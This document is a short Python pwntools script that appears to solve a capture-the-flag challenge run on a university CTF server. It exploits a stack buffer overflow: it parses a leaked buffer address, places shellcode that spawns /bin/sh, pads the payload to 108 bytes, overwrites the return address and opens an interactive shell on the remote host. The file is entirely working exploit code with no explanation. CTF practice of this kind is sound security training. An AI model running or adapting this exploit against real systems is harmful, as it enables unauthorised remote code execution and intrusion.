from pwn import *

context.update(arch='i386', os='linux')

LOCAL = False

if LOCAL:
    p = process("./program")
else:    
    p = remote("ctf-fsi.fe.up.pt", 4001)

p.recvuntil(b"Your buffer is ")
buffer = p.recvuntil(b".")[:-1]
buffer = (int(buffer, 16))

shellcode = shellcraft.sh()
shellcode = asm(shellcode)

payload = shellcode + b'\x00' * (108 - len(shellcode)) + p32(buffer)

p.sendline(payload)
p.interactive()